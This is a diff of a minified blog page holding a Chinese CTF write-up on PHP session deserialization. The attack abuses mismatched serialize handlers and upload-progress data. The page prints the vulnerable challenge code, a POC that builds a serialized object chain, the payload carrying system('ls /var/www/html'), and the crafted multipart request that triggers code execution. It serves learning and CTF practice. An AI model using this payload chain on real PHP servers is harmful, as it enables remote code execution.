@@ -1,142 +1,54 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="description" content="基于第三届 4.29 “安恒杯”网络安全技术大赛初赛中的题，第三个 web 题，php 反序列化漏洞"/>
-  <meta name="author" content="Reber"/>
-  
-    
-      <title>关于 PHP SESSION 反序列化 | Reber&#39;s Blog</title>
-    
-  
-  <link rel="stylesheet" href="/css/reset.css"/>
-  
-  <link rel="stylesheet" href="/css/smigle.css"/>
-  
-    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
-  
-    <link rel="stylesheet" href="/css/style.css"/>
-  
-  
-    <script src="/js/jquery-3.6.0.min.js"/></script>
-  
-    <script src="/js/highlight.min.js"/></script>
-  
-    <script src="/js/style.js"/></script>
-  
-  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
-  <meta name="msapplication-TileColor" content="#da532c">
-  <meta name="theme-color" content="#ffffff">
-</head>
-
-  <body>
-    <header>
-  <div id="brand">
-    <a class="icon-link" href="https://wyb0.com/">
-      <img
-        class="icon"
-        src="/img/logo.png"
-      />
-    </a>
-    <div class="text">
-      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
-      <h3>只会一点点编程、只会一点点渗透</h3>
-    </div>
-  </div>
-  <nav>
-    
-      
-        
-        <a href="/"><b>Home</b></a>
-      
-         | 
-        <a href="/posts/"><b>Posts</b></a>
-      
-         | 
-        <a href="/categories/"><b>Categories</b></a>
-      
-         | 
-        <a href="/tags/"><b>Tags</b></a>
-      
-         | 
-        <a href="/about/"><b>About</b></a>
-      
-         | 
-        <a href="/friends/"><b>Friends</b></a>
-      
-    
-  </nav>
-  <hr />
-</header>
-
-    <div id="content">
-      
-  <main>
-    <article>
-      <h1>关于 PHP SESSION 反序列化</h1>
-      
-<div class="post-meta">
-    <time>2018-07-23</time>
-    
-    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/php">php</a>,<a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a>)
-</div>
-
-      <div><h3 id="0x00-环境">0x00 环境</h3>
-<p>公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。</p>
-<p>其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题</p>
-<p>我比较菜，这里根据网上已有writeup做了一遍，这里记录一下。。。。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ini" data-lang="ini"><span style="display:flex;"><span><span style="color:#a6e22e">reber@wyb:~$ html cat /proc/version</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Linux version 4.4.0-31-generic (buildd@lgw01-43) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">reber@wyb:~$ html php --version</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">PHP 5.5.9-1ubuntu4.21 (cli) (built: Feb  9 2017 20:54:58)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Copyright (c) 1997-2014 The PHP Group</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">reber@ubuntu-linux:~$ apachectl -v</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Server version: Apache/2.4.7 (Ubuntu)</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Server built:   Jul 15 2016 15:34:04</span>
-</span></span></code></pre></div><pre tabindex="0"><code>#php.ini部分相关配置
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="基于第三届 4.29 “安恒杯”网络安全技术大赛初赛中的题，第三个 web 题，php 反序列化漏洞"><meta name=author content="Reber"><title>关于 PHP SESSION 反序列化 | Reber's Blog</title>
+<link rel=stylesheet href=/css/reset.css><link rel=stylesheet href=/css/smigle.css><link rel=stylesheet href=/css/monokai-sublime.min.css><link rel=stylesheet href=/css/style.css><script src=/js/jquery-3.6.0.min.js></script><script src=/js/highlight.min.js></script><script src=/js/style.js></script><link rel=icon type=image/img sizes=16x16 href=/img/logo.png><meta name=msapplication-TileColor content="#da532c"><meta name=theme-color content="#ffffff"></head><body><header><div id=brand><a class=icon-link href=https://wyb0.com/><img class=icon src=/img/logo.png></a><div class=text><a href=https://wyb0.com/><h1>Reber's Blog</h1></a><h3>会一点点编程、会一点点渗透</h3></div></div><nav><a href=/><b>Home</b></a>
+|
+<a href=/posts/><b>Posts</b></a>
+|
+<a href=/categories/><b>Categories</b></a>
+|
+<a href=/tags/><b>Tags</b></a>
+|
+<a href=/about/><b>About</b></a>
+|
+<a href=/friends/><b>Friends</b></a></nav><hr></header><div id=content><main><article><h1>关于 PHP SESSION 反序列化</h1><div class=post-meta><time>2018-07-23</time>
+[<a href=/categories/Pentest>Pentest</a>](<a href=/tags/php>php</a>,<a href=/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96>反序列化</a>)</div><div><h3 id=0x00-环境>0x00 环境</h3><p>公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。</p><p>其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题</p><p>我比较菜，这里根据网上已有writeup做了一遍，这里记录一下。。。。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=display:flex><span><span style=color:#a6e22e>reber@wyb:~$ html cat /proc/version</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Linux version 4.4.0-31-generic (buildd@lgw01-43) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>reber@wyb:~$ html php --version</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>PHP 5.5.9-1ubuntu4.21 (cli) (built: Feb  9 2017 20:54:58)</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Copyright (c) 1997-2014 The PHP Group</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>reber@ubuntu-linux:~$ apachectl -v</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Server version: Apache/2.4.7 (Ubuntu)</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Server built:   Jul 15 2016 15:34:04</span>
+</span></span></code></pre></div><pre tabindex=0><code>#php.ini部分相关配置
 session.auto_start=Off
 session.serialize_handler=php_serialize
 session.upload_progress.cleanup=Off
 session.upload_progress.enabled=On
-</code></pre><h3 id="0x01-php-session-序列化及反序列化处理器">0x01 PHP Session 序列化及反序列化处理器</h3>
-<p>php在session存储和读取时,都会有一个序列化和反序列化的过程，反序列化中会调用对象的magic方法,比如<code>__destruct(),__wakeup()</code>等</p>
-<p>PHP 内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化，这几种处理器如下：</p>
-<pre tabindex="0"><code>---------------------------------------------------------------------------------------------
+</code></pre><h3 id=0x01-php-session-序列化及反序列化处理器>0x01 PHP Session 序列化及反序列化处理器</h3><p>php在session存储和读取时,都会有一个序列化和反序列化的过程，反序列化中会调用对象的magic方法,比如<code>__destruct(),__wakeup()</code>等</p><p>PHP 内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化，这几种处理器如下：</p><pre tabindex=0><code>---------------------------------------------------------------------------------------------
 处理器                      |对应的存储格式
 ---------------------------------------------------------------------------------------------
 php                        |键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值
 php_binary                 |键名的长度对应的ASCII字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值
 php_serialize (php&gt;=5.5.4) |经过 serialize() 函数反序列处理的数组
 ---------------------------------------------------------------------------------------------
-</code></pre><p>一般来说当你访问一个网站时若浏览器Cookie中生成 PHPSESSID=02jhnntphc2sg87i03kvv99425;，则服务器会生成名字类似于sess_02jhnntphc2sg87i03kvv99425的对应session文件，里面存的就是session信息</p>
-<p>比如<code>http://10.11.11.11/test.php</code>有如下代码：</p>
-<pre tabindex="0"><code>&lt;?php
+</code></pre><p>一般来说当你访问一个网站时若浏览器Cookie中生成 PHPSESSID=02jhnntphc2sg87i03kvv99425;，则服务器会生成名字类似于sess_02jhnntphc2sg87i03kvv99425的对应session文件，里面存的就是session信息</p><p>比如<code>http://10.11.11.11/test.php</code>有如下代码：</p><pre tabindex=0><code>&lt;?php
     session_start();
     $name = $_GET[&#39;name&#39;];
     $passwd = $_GET[&#39;passwd&#39;];
     $_SESSION[&#39;name&#39;] = $name;
     $_SESSION[&#39;passwd&#39;] = $passwd;
 ?&gt;
-</code></pre><p>当你访问<code>10.11.11.11/test.php?name=xiaoming&amp;passwd=123456</code>时，使用不同处理器时session文件就会存入相应格式的序列化字符串：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span><span style="color:#f92672">---------------------------------------------------------------------------------------
-</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span>处理器                      |对应存储的序列化字符串
-</span></span><span style="display:flex;"><span><span style="color:#f92672">---------------------------------------------------------------------------------------
-</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span>php                        |name|s:8:&#34;xiaoming&#34;;passwd|s:6:&#34;123456&#34;;
-</span></span><span style="display:flex;"><span>php_binary                 |names:8:&#34;xiaoming&#34;;passwds:6:&#34;123456&#34;;
-</span></span><span style="display:flex;"><span>php_serialize (php&gt;=5.5.4) |a:2:{s:4:&#34;name&#34;;s:8:&#34;xiaoming&#34;;s:6:&#34;passwd&#34;;s:6:&#34;123456&#34;;}
-</span></span><span style="display:flex;"><span><span style="color:#f92672">---------------------------------------------------------------------------------------
-</span></span></span></code></pre></div><p>如果 PHP 在反序列化存储的 SESSION 数据时使用的处理器和序列化时使用的处理器不同，可能会导致数据无法正确反序列化，经过构造甚至可以执行代码</p>
-<h3 id="0x02-相关文件">0x02 相关文件</h3>
-<p>一共有三个文件：</p>
-<ul>
-<li>class.php</li>
-</ul>
-<pre tabindex="0"><code>&lt;?php
+</code></pre><p>当你访问<code>10.11.11.11/test.php?name=xiaoming&amp;passwd=123456</code>时，使用不同处理器时session文件就会存入相应格式的序列化字符串：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-diff data-lang=diff><span style=display:flex><span><span style=color:#f92672>---------------------------------------------------------------------------------------
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span>处理器                      |对应存储的序列化字符串
+</span></span><span style=display:flex><span><span style=color:#f92672>---------------------------------------------------------------------------------------
+</span></span></span><span style=display:flex><span><span style=color:#f92672></span>php                        |name|s:8:&#34;xiaoming&#34;;passwd|s:6:&#34;123456&#34;;
+</span></span><span style=display:flex><span>php_binary                 |names:8:&#34;xiaoming&#34;;passwds:6:&#34;123456&#34;;
+</span></span><span style=display:flex><span>php_serialize (php&gt;=5.5.4) |a:2:{s:4:&#34;name&#34;;s:8:&#34;xiaoming&#34;;s:6:&#34;passwd&#34;;s:6:&#34;123456&#34;;}
+</span></span><span style=display:flex><span><span style=color:#f92672>---------------------------------------------------------------------------------------
+</span></span></span></code></pre></div><p>如果 PHP 在反序列化存储的 SESSION 数据时使用的处理器和序列化时使用的处理器不同，可能会导致数据无法正确反序列化，经过构造甚至可以执行代码</p><h3 id=0x02-相关文件>0x02 相关文件</h3><p>一共有三个文件：</p><ul><li>class.php</li></ul><pre tabindex=0><code>&lt;?php
 
 highlight_string(file_get_contents(basename($_SERVER[&#39;PHP_SELF&#39;])));
 //show_source(__FILE__);
@@ -181,10 +93,7 @@ class foo3{
 }
 
 ?&gt;
-</code></pre><ul>
-<li>index.php</li>
-</ul>
-<pre tabindex="0"><code>&lt;?php
+</code></pre><ul><li>index.php</li></ul><pre tabindex=0><code>&lt;?php
     ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
     //服务器反序列化使用的处理器是php_serialize，而这里使用了php，所以会出现安全问题
     require(&#34;./class.php&#34;);
@@ -193,10 +102,7 @@ class foo3{
     $obj = new foo1();
     $obj-&gt;varr = &#34;phpinfo.php&#34;;
 ?&gt;
-</code></pre><ul>
-<li>phpinfo.php</li>
-</ul>
-<pre tabindex="0"><code>&lt;?php
+</code></pre><ul><li>phpinfo.php</li></ul><pre tabindex=0><code>&lt;?php
     session_start();
     require(&#34;./class.php&#34;);
 
@@ -204,19 +110,7 @@ class foo3{
     $f3-&gt;varr = &#34;phpinfo();&#34;;
     $f3-&gt;execute();
 ?&gt;
-</code></pre><h3 id="0x03-解题思路">0x03 解题思路</h3>
-<p>先说下session.upload_progress.enabled，当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。</p>
-<p>当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在$_SESSION中获得。</p>
-<p>当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。</p>
-<p>假如说正常服务器php使用的是php_serialize处理器时，若post：name=xiaoming&amp;passwd=123456|aaaaaaaaa，</p>
-<p>则session中存的就是<code>a:2:{s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:6:&quot;passwd&quot;;s:16:&quot;123456|aaaaaaaaa&quot;;}</code>，若还用php_serialize读取数据的话还能读取到正常数据</p>
-<p>但若以php处理器读取时得到的就是键为<code>a:2:{s:4:&quot;name&quot;;s:8:&quot;xiaoming&quot;;s:6:&quot;passwd&quot;;s:16:&quot;123456</code>，</p>
-<p>值为<code>|</code>后面的序列化字符串反序列化后的数据(因为php处理器存储的格式是：键名|反序列后的值)</p>
-<p>当前代码的话没有向服务器提交数据，但是现在session.upload_progress.enabled是开启的，所以可以通过上传文件，从而在session文件中写入数据</p>
-<ul>
-<li>POC</li>
-</ul>
-<pre tabindex="0"><code>&lt;?php
+</code></pre><h3 id=0x03-解题思路>0x03 解题思路</h3><p>先说下session.upload_progress.enabled，当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。</p><p>当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在$_SESSION中获得。</p><p>当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。</p><p>假如说正常服务器php使用的是php_serialize处理器时，若post：name=xiaoming&amp;passwd=123456|aaaaaaaaa，</p><p>则session中存的就是<code>a:2:{s:4:"name";s:8:"xiaoming";s:6:"passwd";s:16:"123456|aaaaaaaaa";}</code>，若还用php_serialize读取数据的话还能读取到正常数据</p><p>但若以php处理器读取时得到的就是键为<code>a:2:{s:4:"name";s:8:"xiaoming";s:6:"passwd";s:16:"123456</code>，</p><p>值为<code>|</code>后面的序列化字符串反序列化后的数据(因为php处理器存储的格式是：键名|反序列后的值)</p><p>当前代码的话没有向服务器提交数据，但是现在session.upload_progress.enabled是开启的，所以可以通过上传文件，从而在session文件中写入数据</p><ul><li>POC</li></ul><pre tabindex=0><code>&lt;?php
 class foo3{
     public $varr;
     function __construct(){
@@ -242,24 +136,13 @@ class foo1{
  
 echo serialize(new foo1());
 ?&gt;
-</code></pre><ul>
-<li>上传表单</li>
-</ul>
-<p>这里的action只要是服务器上代码中有session_start()的php文件即可</p>
-<pre tabindex="0"><code>&lt;form action=&#34;http://192.168.3.136/index.php&#34; method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt;        
+</code></pre><ul><li>上传表单</li></ul><p>这里的action只要是服务器上代码中有session_start()的php文件即可</p><pre tabindex=0><code>&lt;form action=&#34;http://192.168.3.136/index.php&#34; method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt;        
     &lt;input type=&#34;hidden&#34; name=&#34;PHP_SESSION_UPLOAD_PROGRESS&#34; value=&#34;123&#34; /&gt;        
     &lt;input type=&#34;file&#34; name=&#34;file&#34; /&gt;        
     &lt;input type=&#34;submit&#34; /&gt;
 &lt;/form&gt;
-</code></pre><h3 id="0x04-利用">0x04 利用</h3>
-<ul>
-<li>首先利用poc生成序列化的payload</li>
-</ul>
-<pre tabindex="0"><code>O:4:&#34;foo1&#34;:1:{s:4:&#34;varr&#34;;O:4:&#34;foo2&#34;:2:{s:4:&#34;varr&#34;;s:1:&#34;1&#34;;s:3:&#34;obj&#34;;O:4:&#34;foo3&#34;:1:{s:4:&#34;varr&#34;;s:27:&#34;system(&#39;ls /var/www/html&#39;);&#34;;}}}
-</code></pre><ul>
-<li>通过上面的表单上传文件时抓包改包如下</li>
-</ul>
-<pre tabindex="0"><code>POST /phpinfo.php HTTP/1.1
+</code></pre><h3 id=0x04-利用>0x04 利用</h3><ul><li>首先利用poc生成序列化的payload</li></ul><pre tabindex=0><code>O:4:&#34;foo1&#34;:1:{s:4:&#34;varr&#34;;O:4:&#34;foo2&#34;:2:{s:4:&#34;varr&#34;;s:1:&#34;1&#34;;s:3:&#34;obj&#34;;O:4:&#34;foo3&#34;:1:{s:4:&#34;varr&#34;;s:27:&#34;system(&#39;ls /var/www/html&#39;);&#34;;}}}
+</code></pre><ul><li>通过上面的表单上传文件时抓包改包如下</li></ul><pre tabindex=0><code>POST /phpinfo.php HTTP/1.1
 Host: 10.11.11.11
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -280,51 +163,13 @@ Content-Type: text/plain
 
 abcdefg
 -----------------------------1971979777391321181548092978--
-</code></pre><p><img src="/img/post/php-session-unserialize-1.png" alt=""></p>
-<p>请求后服务器上生成的session文件sess_6oa2pegcmlejjvhr4t68ric5l5的内容为：</p>
-<pre tabindex="0"><code>a:1:{s:152:&#34;upload_progress_123|O:4:&#34;foo1&#34;:1:{s:4:&#34;varr&#34;;O:4:&#34;foo2&#34;:2:{s:4:&#34;varr&#34;;s:1:&#34;1&#34;;s:3:&#34;obj&#34;;O:4:&#34;foo3&#34;:1:{s:4:&#34;varr&#34;;s:27:&#34;system(&#39;ls /var/www/html&#39;);&#34;;}}}
-</code></pre><ul>
-<li>改包重新访问从而执行代码</li>
-</ul>
-<p><img src="/img/post/php-session-unserialize-2.png" alt=""></p>
-<ul>
-<li>然后更改poc中的payload生成新的序列化字符串，重复上述操作即可得到flag</li>
-</ul>
-<h4 id="reference侵删">Reference(侵删)：</h4>
-<ul>
-<li><a href="http://drops.wooyun.org/tips/3909?_blank">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a></li>
-<li><a href="https://www.tuicool.com/articles/BfuayyI?_blank">安恒429|web 3 session反序列化</a></li>
-<li><a href="http://www.mottoin.com/18436.html?_blank">有趣的php反序列化总结</a></li>
-</ul>
-</div>
-    </article>
-  </main>
-
-    </div>
-    <footer>
-  <hr />
-  
-    <p id="social">
-      Find me around the web:
-      
-        
-        <a href="https://github.com/reber0?_blank">GitHub</a>
-      
-         • 
-        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
-      
-    </p>
-  
-  <p class="copyright">
-    Copyright © 2015-2024
-    <a href="https://wyb0.com/"><strong>Reber</strong></a>.
-
-    Built with
-    <a href="http://www.gohugo.io/">Hugo</a>,
-    based on the theme
-    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
-  </p>
-</footer>
-
-  </body>
-</html>
+</code></pre><p><img src=/img/post/php-session-unserialize-1.png alt></p><p>请求后服务器上生成的session文件sess_6oa2pegcmlejjvhr4t68ric5l5的内容为：</p><pre tabindex=0><code>a:1:{s:152:&#34;upload_progress_123|O:4:&#34;foo1&#34;:1:{s:4:&#34;varr&#34;;O:4:&#34;foo2&#34;:2:{s:4:&#34;varr&#34;;s:1:&#34;1&#34;;s:3:&#34;obj&#34;;O:4:&#34;foo3&#34;:1:{s:4:&#34;varr&#34;;s:27:&#34;system(&#39;ls /var/www/html&#39;);&#34;;}}}
+</code></pre><ul><li>改包重新访问从而执行代码</li></ul><p><img src=/img/post/php-session-unserialize-2.png alt></p><ul><li>然后更改poc中的payload生成新的序列化字符串，重复上述操作即可得到flag</li></ul><h4 id=reference侵删>Reference(侵删)：</h4><ul><li><a href=http://drops.wooyun.org/tips/3909?_blank>PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a></li><li><a href=https://www.tuicool.com/articles/BfuayyI?_blank>安恒429|web 3 session反序列化</a></li><li><a href=http://www.mottoin.com/18436.html?_blank>有趣的php反序列化总结</a></li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
